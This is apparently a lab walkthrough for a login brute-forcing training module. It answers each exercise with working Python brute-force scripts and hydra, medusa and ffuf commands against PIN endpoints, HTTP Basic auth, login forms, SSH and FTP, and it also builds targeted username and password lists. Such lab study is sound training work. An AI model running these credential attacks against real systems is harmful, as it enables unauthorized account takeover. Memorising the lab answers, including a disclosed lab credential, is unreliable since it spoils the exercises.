# Login Brute-Forcing

---

## Question

**After successfully brute-forcing the PIN, what is the full flag the script returns?**

### Answer

### Python Brute-Force Script

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Target configuration
ip = "SERVER_IP"        # Target IP address
port = PORT             # Target port number
url = f"http://{ip}:{port}/pin"

def try_pin(pin):
    # Format PIN to 4 digits (0000–9999)
    formatted_pin = f"{pin:04d}"
    try:
        # Send GET request with PIN
        response = requests.get(f"{url}?pin={formatted_pin}", timeout=5)
        if response.ok:
            data = response.json()
            # Check if response contains the flag
            if 'flag' in data:
                print(f"\n[+] Success! PIN: {formatted_pin}")
                print(f"[+] Flag: {data['flag']}")
                return True
    except requests.exceptions.RequestException:
        pass
    return False

# Run brute-force using multiple threads
with ThreadPoolExecutor(max_workers=50) as executor:
    print("Brute-forcing... please wait.")
    for result in executor.map(try_pin, range(10000)):
        if result:
            executor.shutdown(wait=False, cancel_futures=True)
            break
```

### Alternative (ffuf)

```bash
# Generate 4-digit PINs and fuzz the endpoint
seq -f "%04g" 0 9999 | ffuf \
-u http://SERVER_IP:PORT/pin?pin=FUZZ \
-w - \
-mr "flag" \
-mc 200 \
-ac
```

**Result**

* Full flag returned by the server ✅

---

## Question

**After successfully brute-forcing the target using the script, what is the full flag the script returns?**

### Answer

### Dictionary Attack Script

```python
import requests

# Target configuration
ip = "SERVER_IP"     # Target IP
port = PORT          # Target port

# Download common password list
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

# Attempt each password
for password in passwords:
    print(f"Attempted password: {password}")

    # Send POST request with password
    response = requests.post(
        f"http://{ip}:{port}/dictionary",
        data={'password': password}
    )

    # Check for flag in response
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

**Result**

* Flag successfully retrieved ✅

---

## Question

**After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

### Answer

### HTTP Basic Authentication (Hydra)

```bash
# Brute-force HTTP Basic Auth credentials
hydra -l basic-auth-user \
-P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
SERVER_IP \
http-get / \
-s PORT
```

**Result**

* Valid credentials found
* Flag obtained after login ✅

---

## Question

**After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

### Answer

### HTTP POST Login Form

```bash
# Brute-force login form credentials
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
-f SERVER_IP \
-s PORT \
http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Result**

* Valid credentials found
* Flag retrieved after login ✅

---

## Question

**What was the password for the ftpuser? After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?**

### Answer

### SSH Brute-Force

```bash
# Brute-force SSH credentials
medusa -h SERVER_IP \
-n PORT \
-u sshuser \
-P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
-M ssh \
-t 3
```

### SSH Login

```bash
# Login using discovered SSH credentials
ssh sshuser@SERVER_IP -p PORT
```

### Enumeration

```bash
# Check listening services
netstat -tulpn | grep LISTEN

# Scan localhost ports
nmap localhost
```

### FTP Brute-Force

```bash
# Brute-force FTP credentials
medusa -h 127.0.0.1 \
-u ftpuser \
-P 2023-200_most_used_passwords.txt \
-M ftp \
-t 5
```

### FTP Login & Flag

```bash
# Login to FTP using discovered credentials
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

# List files
ls

# Download flag
get flag.txt
exit

# Read flag
cat flag.txt
```

**Result**

* FTP password recovered
* Flag retrieved ✅

---

## Question

**After successfully brute-forcing, and then logging into the target, what is the full flag you find?**

### Answer

### Username Generation

```bash
# Generate usernames using known victim information
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### Password Wordlist Generation

```bash
# Generate custom password list using cupp
cupp -i
```

### Filter Password List

```bash
# Filter passwords (length, complexity, symbols)
grep -E '^.{6,}$' jane.txt \
| grep -E '[A-Z]' \
| grep -E '[a-z]' \
| grep -E '[0-9]' \
| grep -E '([!@#$%^&*].*){2,}' \
> jane-filtered.txt
```

### Brute-Force Login

```bash
# Brute-force login using generated usernames and passwords
hydra -L usernames.txt \
-P jane-filtered.txt \
SERVER_IP \
-s PORT \
-f \
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

**Result**

* Valid credentials found
* Flag obtained ✅

---

## Question

**What is the password for the basic auth login?**

### Answer

```bash
# Brute-force HTTP Basic Authentication
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
SERVER_IP \
-s PORT \
http-get / \
-t 64 \
-f -V
```

**Result**

* Basic auth password identified ✅

---

## Question

**What is the username of the ftp user you find via brute-forcing? What is the flag contained within flag.txt**

### Answer

### SSH Brute-Force

```bash
# Brute-force SSH credentials
hydra -l satwossh \
-P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt \
SERVER_IP \
-s PORT \
ssh \
-t 4 -f -V
```

### SSH Login

```bash
# Login to SSH
ssh satwossh@SERVER_IP -p PORT
```

### Enumeration

```bash
# Read incident report
cat IncidentReport/txt
```

### FTP Username Discovery

```bash
# Generate username list
./username-anarchy Thomas Smith > thomas_smith_usernames.txt
```

### FTP Brute-Force

```bash
# Brute-force FTP login
hydra -L thomas_smith_usernames.txt \
-P passwords.txt \
ftp://127.0.0.1 \
-t 4 -f -V
```

### FTP Login & Flag

```bash
# Login to FTP
ftp ftp://thomas:chocolate!@localhost

# Download flag
get flag.txt
exit

# Read flag
cat flag.txt
```

**Result**

* FTP username identified
* Flag successfully retrieved ✅

---
